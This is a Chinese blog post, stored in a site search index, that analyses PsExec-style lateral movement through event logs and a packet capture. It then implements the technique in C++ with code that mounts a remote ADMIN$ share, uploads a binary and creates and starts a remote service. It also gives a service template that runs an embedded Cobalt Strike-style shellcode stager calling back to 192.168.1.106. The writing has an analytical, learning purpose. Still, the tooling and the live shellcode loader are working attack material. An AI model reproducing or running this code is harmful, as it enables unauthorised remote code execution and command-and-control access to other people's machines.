<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>psexec原理分析</title>
    <link href="/2021/06/20/psexec/"/>
    <url>/2021/06/20/psexec/</url>
    
    <content type="html"><![CDATA[<p>##前言<br>参加某行动时通过psexec横向过几台主机,正好之前在网上看到很多大佬分析过这款工具,今天也自己动手重新分析一次<br>因为很大程度上是学着大佬分析思路来分析的,所以先把参考写在前面:<br><a href="https://payloads.online/archivers/2020-04-02/1">https://payloads.online/archivers/2020-04-02/1</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/108455478">https://blog.csdn.net/qq_41874930/article/details/108455478</a></p><p>##Psexec<br>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。<br>psexec工具下载地址:<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a><br>cs也直接集成了这款工具</p><p>##Psexec原理分析<br>环境<br>win10  ip：192.168.154.7<br>win server 2008  X64 192.168.154.31<br>假设已经得到win10主机的system权限</p><p>在cs上通过psexec64来横向win2008</p><p>这里看到是需要账户和密码的,但是在内网环境中很多密码都是批量设置的,也就是说通过已经拿到的win10的hash去尝试登录内网其他主机</p><p>可以看到win2008直接上线,并且是system权限</p><p> 看一下win2008的安全日志</p><p> 看到有多个安全日志的产生</p><p>在事件4624中,看到了win10的ip,也就是申请管理的ip</p><p>采用的NTMLv2协议,即便不知道明文,有hash值就可以转递</p><p> 再看系统日志</p><p>ADMIN$这个是ipc共享中的默认共享,通常指向C:\Windows</p><p>猜想就是通过这个exe上线</p><p> 这里肯定是与直接在win10上通过Psexec管理win2008的流程是不一样的,cs上执行主要目的还是反弹shell到cs上</p><p>大致流程为:</p><p>1.登陆远程主机   事件ID4624</p><p>2.连接admin$共享   事件ID7045</p><p>3.写入xxxx.exe文件到共享目录下也就是c:\windows下</p><p>4.执行xxxx.exe,随即上线</p><p>通过wireshark网络分析<br>直接在win10上通过psexec管理win2008</p><p>.\PsExec.exe \192.168.154.31 -u administrator -p 123456 cmd</p><p>设置过滤规则</p><p>ip.src==192.168.154.31 or ip.dst==192.168.154.31</p><p>1.先进行TCP三次握手</p><p>2.协商协议</p><p>3.进行NTML验证</p><p>4.尝试连接$IPC</p><p>5.尝试连接ADMIN$</p><p>6.尝试写入PSEXESVC.exe</p><p>后续TCP数据包的内容,4D5A,标准的pe文件</p><p> 文件写入完毕后,执行API安装服务</p><p> 服务启动后会建立一个管道</p><p>实际上一共创建了4个管道</p><p>整体流程跟从被连接主机的事件看到的流程基本一致。基本都是ntlm认证、连接共享目录admin$、写文件psexesvc到共享目录、调用svcctl服务来间接调用psexesvc服务、创建四个命名管道。</p><p>实现psexec<br>一.与目标主机建立SMB连接<br>WNetAddConnection2</p><p>DWORD WNetAddConnection2W(<br>  LPNETRESOURCEW lpNetResource,<br>  LPCWSTR        lpPassword,<br>  LPCWSTR        lpUserName,<br>  DWORD          dwFlags<br>);<br>这里有例子:<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/en-us/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p><p>DWORD ConnectSMBServer(LPCWSTR lpwsHost, LPCWSTR lpwsUserName, LPCWSTR lpwsPassword)<br>{<br>    // 用于存放SMB共享资源格式<br>    PWCHAR lpwsIPC = new WCHAR[MAX_PATH];<br>    DWORD dwRetVal; // 函数返回值<br>    NETRESOURCE nr; // 连接的详细信息<br>    DWORD dwFlags; // 连接选项</p><pre><code>ZeroMemory(&amp;nr, sizeof(NETRESOURCE));swprintf(lpwsIPC, MAX_PATH, TEXT(&quot;\%s\admin$&quot;), lpwsHost);nr.dwType = RESOURCETYPE_ANY; // 枚举所有资源nr.lpLocalName = NULL;nr.lpRemoteName = lpwsIPC; // 资源的网络名nr.lpProvider = NULL;// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。dwFlags = CONNECT_UPDATE_PROFILE;dwRetVal = WNetAddConnection2(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);if (dwRetVal == NO_ERROR) &#123;    printf(&quot;Connection added to %s\n&quot;, nr.lpRemoteName);    return dwRetVal;&#125;printf(&quot;WNetAddConnection2 failed with error: %d\n&quot;, dwRetVal);return -1;</code></pre><p>}<br>二.上传文件到目标主机<br>将现有文件拷贝到新文件</p><p>BOOL CopyFile(<br>  LPCTSTR lpExistingFileName,<br>  LPCTSTR lpNewFileName,<br>  BOOL    bFailIfExists<br>);<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-copyfile?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINBASE%252FCopyFile);k(CopyFile);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><p>BOOL UploadFileBySMB(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)<br>{<br>    DWORD dwRetVal;<br>    dwRetVal = CopyFile(lpwsSrcPath, lpwsDstPath, FALSE);<br>    return dwRetVal &gt; 0 ? TRUE : FALSE;<br>}<br>三.开启服务<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=?appId=Dev16IDEF1&l=ZH-CN&k=k(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)&rd=true">https://docs.microsoft.com/zh-cn/windows/win32/api/winsvc/nf-winsvc-openscmanagera?redirectedfrom=MSDN&amp;f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINSVC%252FOpenSCManager);k(OpenSCManager);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue</a></p><p>SC_HANDLE OpenSCManagerA(<br>  LPCSTR lpMachineName,<br>  LPCSTR lpDatabaseName,<br>  DWORD  dwDesiredAccess<br>);<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew</a></p><p>SC_HANDLE CreateServiceW(<br>  SC_HANDLE hSCManager,<br>  LPCWSTR   lpServiceName,<br>  LPCWSTR   lpDisplayName,<br>  DWORD     dwDesiredAccess,<br>  DWORD     dwServiceType,<br>  DWORD     dwStartType,<br>  DWORD     dwErrorControl,<br>  LPCWSTR   lpBinaryPathName,<br>  LPCWSTR   lpLoadOrderGroup,<br>  LPDWORD   lpdwTagId,<br>  LPCWSTR   lpDependencies,<br>  LPCWSTR   lpServiceStartName,<br>  LPCWSTR   lpPassword<br>);<br>先使用OpenSCManager在目标机器上建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</p><p>然后用CreateService创建一个服务,再通过OpenService,StartService打开并开启服务</p><p>BOOL CreateServices(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)<br>{<br>    wprintf(L”Will Create Service %s\n” ,lpwsServiceName);<br>    SC_HANDLE hSCM;<br>    SC_HANDLE hService;<br>    SERVICE_STATUS ss;<br>    hSCM = OpenSCManager(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);<br>    if (hSCM == NULL)<br>    {<br>        printf(“OpenSCManager Error: %d\n”,GetLastError());<br>        return -1;<br>    }</p><pre><code>hService = CreateService(    hSCM, // 服务控制管理器数据库的句柄    lpwsServiceName, // 要安装的服务的名称    lpwsServiceName, // 用户界面程序用来标识服务的显示名称    GENERIC_ALL, // 访问权限    SERVICE_WIN32_OWN_PROCESS, // 与一个或多个其他服务共享一个流程的服务    SERVICE_DEMAND_START, // 当进程调用StartService函数时，由服务控制管理器启动的服务 。    SERVICE_ERROR_IGNORE, // 启动程序将忽略该错误并继续启动操作    lpwsServicePath, // 服务二进制文件的标准路径    NULL,    NULL,    NULL,    NULL,    NULL);if (hService == NULL) &#123;    printf(&quot;CreateService Error: %d\n&quot;,GetLastError());    return -1;&#125;wprintf(L&quot;Create Service Success : %s\n&quot;,lpwsServicePath);hService = OpenService(hSCM, lpwsServiceName, GENERIC_ALL);if (hService == NULL) &#123;    printf(&quot;OpenService Error: %d\n&quot;, GetLastError());    return -1;&#125;printf(&quot;OpenService Success: %d!\n&quot;);StartService(hService, NULL, NULL);return 0;</code></pre><p>}<br>这里我生成一个cs的马,改名为sd</p><p> win2008</p><p> 但是以这种方式运行服务的话一会儿就会掉,随即cs掉线</p><p>打开系统日志查看</p><p> 我的理解是:要创建一个服务的话这个服务得是满足windows服务规定的格式,而不是随便一个pe文件都可以充当服务</p><p>编写服务程序<br>服务介绍<br>    几乎所有的操作系统在启动的时候都会启动一些不需要与用户交互的进程，这些进程在Windows中就被称作服务。它通常用于实现客户／服务器模式中的服务器方，如我们常见的Ｗeb服务IIS，当操作系统在启动后它就自动被运行，不管是否有人登陆到系统只要系统开启它就能得到运行。<br>    服务程序、服务控制程序（SCP，service control program）和服务控制管理器（SCM，service control manager）组成了Windows服务。我们可以通过服务控制程序操纵服务控制管理器来配置、启动、暂停、停止服务程序。其中服务程序和服务控制程序可以由我们自己来编写扩展，而服务控制管理器（windowssystem32servics.exe）则是操作系统内置的一个部件。<br>    SCM本身也是一个服务程序（windowssystem32servics.exe），作为windows的后台服务运行的。Winlogon在系统引导的早期会将SCM启动起来。</p><p>可以看一下这篇文章,写的比较详细<br><a href="https://blog.csdn.net/swartz_lubel/article/details/70255686">https://blog.csdn.net/swartz_lubel/article/details/70255686</a></p><p>倾旋大佬博客中也已经给出了一个编写windwos服务的模板,链接在文章的开头<br>还有几篇介绍windows服务编写的:<br> <a href="http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/">http://www.haoservice.cn/2019/11/27/Applied13%E8%AE%A4%E8%AF%86windows%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%BD%BF%E7%94%A8VC++%E5%88%9B%E5%BB%BAwindows%E6%9C%8D%E5%8A%A1%E7%A8%8B%E5%BA%8F/</a></p><p><a href="https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus">https://www.codeproject.com/Articles/499465/Simple-Windows-Service-in-Cplusplus</a><br>模板代码执行:</p><p> 在模板上面加一点执行shellcode的代码:</p><p>#include &lt;windows.h&gt;<br>#include <iostream></p><p>unsigned char buf[] =”\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\xe8\x00\x00\x00\x00\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\xa4\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x8c\x20\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\x50\xe9\x8c\x00\x00\x00\x5b\x31\xd2\x52\x68\x00\x32\xc0\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x5f\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xca\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x75\x07\x58\x50\xe9\x7b\xff\xff\xff\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x6f\xff\xff\xff\x2f\x66\x35\x4a\x77\x00\xc8\x30\x02\x8c\x5c\x82\xe4\x87\x65\xf8\x20\x09\xde\xb1\x2f\xdc\x95\x01\xd0\x7b\xbd\x3d\x1b\x66\xab\x8c\xe7\x0a\x4d\x56\x9d\x0b\xc3\x72\x3b\xc9\x9b\x73\xbf\xf4\x2f\x5e\xc6\x90\xd9\xf7\x8e\x88\x03\x52\x65\x23\x2b\xd9\x53\x40\x7e\x87\x53\x49\x81\xfd\x59\x2c\x23\x89\xc8\x9d\x5e\x4f\x47\xc0\x28\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x38\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x35\x2e\x31\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x34\x2e\x30\x29\x0d\x0a\x00\x70\x02\x56\xfd\x0a\xc6\x4b\xf8\x24\x5c\xc3\x50\x1f\x5e\x03\x3a\xf3\xd7\x1a\x81\xe7\x2c\x84\x3e\x16\xef\x20\xb4\x9b\x83\xe3\x80\x73\x48\x74\x0d\xcb\xbd\x7a\xf4\xa6\xbb\x66\x7e\x95\xfa\x8e\x7c\x9e\x5d\xaf\xf5\xf8\xcb\x37\x7f\x5f\x8c\xb5\x16\x45\xe1\x86\xb6\x68\x11\xe2\xb4\xd0\x63\x61\x60\xef\x21\xfe\xf7\xed\xfa\xd8\xf3\xc5\xd8\xe8\xf1\x47\x96\x43\xad\x77\xe2\x57\xc3\x18\x16\xe9\x8c\x21\x75\x1d\xe7\xa2\xaa\x4a\xb6\xce\x4f\x7f\x67\x8e\xed\x02\x0c\x33\x7d\x36\x67\xb0\xd2\x72\x16\x40\x9c\xc4\xaa\x7d\xb8\x57\xb6\x00\x17\x23\x43\x78\x4c\xa9\x1b\xc4\x19\x76\x7e\xc2\x45\x7d\x11\xe2\x12\x6c\xa4\xe0\x42\xe4\x8a\xfd\x0d\xc8\x9a\xf4\xa9\xb6\x5a\x2e\x9f\x50\x63\x15\x85\xbe\x42\x47\xde\x9b\x9d\xf2\x13\xd0\xbe\x85\x0a\xe2\x12\x52\x47\x7b\x27\xce\x08\xc3\x63\x55\xf8\xc1\x83\xbb\x7e\x14\xa3\x3c\xa4\x21\x96\x4a\x54\x19\x06\xbb\x1c\x02\xa5\x95\x7a\xab\x0e\x0a\x66\xc4\xf0\x8c\x30\x90\x1d\x1a\x35\x01\x80\xfb\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x89\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x36\x00\x12\x34\x56\x78”;</p><p>#define SLEEP_TIME 5000                          /<em>间隔时间</em>/<br>#define LOGFILE “C:\Windows\log.txt”              /<em>信息输出文件</em>/</p><p>SERVICE_STATUS ServiceStatus;  /<em>服务状态</em>/<br>SERVICE_STATUS_HANDLE hStatus; /<em>服务状态句柄</em>/</p><p>void  ServiceMain(int argc, char** argv);<br>void  CtrlHandler(DWORD request);<br>int   InitService();</p><p>int main(int argc, CHAR* argv[])<br>{<br>    WCHAR WserviceName[] = TEXT(“sdd”);<br>    SERVICE_TABLE_ENTRY ServiceTable[2];<br>    ServiceTable[0].lpServiceName = WserviceName;<br>    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;<br>    ServiceTable[1].lpServiceName = NULL;<br>    ServiceTable[1].lpServiceProc = NULL;<br>    StartServiceCtrlDispatcher(ServiceTable);</p><pre><code>return 0;</code></pre><p>}</p><p>int WriteToLog(const char* str)<br>{<br>    FILE* pfile;<br>    fopen_s(&amp;pfile, LOGFILE, “a+”);<br>    if (pfile == NULL)<br>    {<br>        return -1;<br>    }<br>    fprintf_s(pfile, “%s\n”, str);<br>    fclose(pfile);</p><pre><code>return 0;</code></pre><p>}</p><p>/<em>Service initialization</em>/<br>int InitService()<br>{<br>    CHAR Message[] = “Monitoring started.”;<br>    OutputDebugString(TEXT(“Monitoring started.”));<br>    int result;<br>    result = WriteToLog(Message);</p><pre><code>return(result);</code></pre><p>}</p><p>/<em>Control Handler</em>/<br>void CtrlHandler(DWORD request)<br>{<br>    switch (request)<br>    {<br>    case SERVICE_CONTROL_STOP:</p><pre><code>    WriteToLog(&quot;Monitoring stopped.&quot;);    ServiceStatus.dwWin32ExitCode = 0;    ServiceStatus.dwCurrentState = SERVICE_STOPPED;    SetServiceStatus(hStatus, &amp;ServiceStatus);    return;case SERVICE_CONTROL_SHUTDOWN:    WriteToLog(&quot;Monitoring stopped.&quot;);    ServiceStatus.dwWin32ExitCode = 0;    ServiceStatus.dwCurrentState = SERVICE_STOPPED;    SetServiceStatus(hStatus, &amp;ServiceStatus);    return;default:    break;&#125;/* Report current status  */SetServiceStatus(hStatus, &amp;ServiceStatus);return;</code></pre><p>}</p><p>void ServiceMain(int argc, char** argv)<br>{<br>    WCHAR WserviceName[] = TEXT(“sdd”);<br>    int error;<br>    ServiceStatus.dwServiceType =<br>        SERVICE_WIN32;<br>    ServiceStatus.dwCurrentState =<br>        SERVICE_START_PENDING;<br>    /<em>在本例中只接受系统关机和停止服务两种控制命令</em>/<br>    ServiceStatus.dwControlsAccepted =<br>        SERVICE_ACCEPT_SHUTDOWN |<br>        SERVICE_ACCEPT_STOP;<br>    ServiceStatus.dwWin32ExitCode = 0;<br>    ServiceStatus.dwServiceSpecificExitCode = 0;<br>    ServiceStatus.dwCheckPoint = 0;<br>    ServiceStatus.dwWaitHint = 0;<br>    hStatus = ::RegisterServiceCtrlHandler(<br>        WserviceName,<br>        (LPHANDLER_FUNCTION)CtrlHandler);<br>    if (hStatus == (SERVICE_STATUS_HANDLE)0)<br>    {</p><pre><code>    WriteToLog(&quot;RegisterServiceCtrlHandler failed&quot;);    return;&#125;WriteToLog(&quot;RegisterServiceCtrlHandler success&quot;);/* Initialize Service   */error = InitService();if (error)&#123;    /* Initialization failed  */    ServiceStatus.dwCurrentState =        SERVICE_STOPPED;    ServiceStatus.dwWin32ExitCode = -1;    SetServiceStatus(hStatus, &amp;ServiceStatus);    return;&#125;LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);memcpy(Memory, buf, sizeof(buf));((void(*)())Memory)();/*向SCM 报告运行状态*/ServiceStatus.dwCurrentState =    SERVICE_RUNNING;SetServiceStatus(hStatus, &amp;ServiceStatus);/*do something you want to do in this while loop*/MEMORYSTATUS memstatus;while (ServiceStatus.dwCurrentState ==    SERVICE_RUNNING)&#123;    char buffer[16];    GlobalMemoryStatus(&amp;memstatus);    int availmb = memstatus.dwAvailPhys / 1024 / 1024;    sprintf_s(buffer, 100, &quot;available memory is %dMB&quot;, availmb);    int result = WriteToLog(buffer);    if (result)    &#123;        ServiceStatus.dwCurrentState = SERVICE_STOPPED;        ServiceStatus.dwWin32ExitCode = -1;        SetServiceStatus(hStatus,            &amp;ServiceStatus);        return;    &#125;    Sleep(SLEEP_TIME);&#125;WriteToLog(&quot;service stopped&quot;);return;</code></pre><p>}</p><p>后记<br>本次研究psexec到这就基本结束了,我自己是没有能力研究出来的,参考了很多大佬的文章,尤其是倾旋大佬,再次感谢！</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
